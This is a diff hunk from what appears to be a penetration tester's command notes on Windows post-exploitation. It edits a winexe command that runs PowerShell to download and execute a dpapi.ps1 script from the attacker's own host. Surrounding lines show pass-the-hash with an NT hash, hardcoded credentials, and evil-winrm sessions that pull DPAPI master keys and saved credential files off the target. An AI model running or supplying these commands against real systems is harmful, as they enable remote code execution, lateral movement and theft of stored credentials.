@@ -1117,7 +1117,7 @@ winexe --pw-nt-hash -U 'Administrator%5917507bdf2ef2c2b0a869a1cba40726' //$TARGE
 
 ## DPAPI: SIDs, CREDENTIALS + MASTERKEYS
 mkdir dpapi
-winexe -U 'dbf%123qweasdF!' //$TARGET "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/dpapi.ps1')\"" | tee dpapi_$TARGET
+winexe -U 'dbf%123qweasdF!' //$TARGET "cmd.exe /c powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/dpapi.ps1')\"" | tee dpapi_$TARGET
 evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
 download ...\S-1-5...\7dc6a492-36e2-4c2d-be66-ba29d263dda2 dpapi/
 download ...\Credentials\936A68B5AC87C545C4A22D1AF264C8E9 dpapi/
